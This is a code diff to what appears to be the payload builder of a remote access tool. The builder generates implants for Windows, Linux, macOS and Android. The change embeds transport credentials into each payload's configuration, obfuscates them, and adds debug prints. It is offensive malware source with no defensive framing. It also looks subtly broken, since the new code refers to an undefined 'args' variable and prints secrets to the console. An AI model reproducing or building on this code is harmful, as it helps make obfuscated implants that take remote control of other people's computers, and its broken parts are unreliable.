@@ -12,6 +12,7 @@ from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
 import scriptlets
+import cPickle
 
 def get_edit_pupyx86_dll(conf):
     return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), conf)
@@ -50,6 +51,7 @@ def get_edit_binary(path, conf):
     binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
     return binary
 
+
 def get_raw_conf(conf, obfuscate=False):
     if not "offline_script" in conf:
         offline_script=""
@@ -60,10 +62,28 @@ def get_raw_conf(conf, obfuscate=False):
     if obfuscate:
         obf_func=compress_encode_obfs
 
+
+    l=launchers[args.launcher]()
+    l.parse_args(args.launcher_args)
+    t=transports[l.get_transport()]
+    creds_src=open("crypto/credentials.py","r").read()
+    creds={}
+    exec creds_src in {}, creds
+    cred_src=b""
+    for c in t.credentials:
+        if c in creds:
+            print colorize("[+] ", "green")+"Embedding credentials %s"%c
+            cred_src+=obf_func("%s=%s"%(c, repr(creds[c])))+"\n"
+        else:
+            print colorize("[!] ", "yellow")+"[-] Credential %s have not been found for transport %s. Fall-back to default credentials. You should edit your crypto/credentials.py file"%(c, l.get_transport())
+    pupy_credentials_mod={"pupy_credentials.py" : cred_src}
+    print pupy_credentials_mod
+    #new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(pupy_credentials_mod)))+"\n"
     new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
     new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
     new_conf+=offline_script
     new_conf+="\n"
+    print new_conf
     
     return new_conf
 
@@ -215,6 +235,9 @@ class ListOptions(argparse.Action):
 
 PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner']
 if __name__=="__main__":
+    if os.path.dirname(__file__):
+        os.chdir(os.path.dirname(__file__))
+
     parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
     parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
     parser.add_argument('-o', '--output', help="output path")
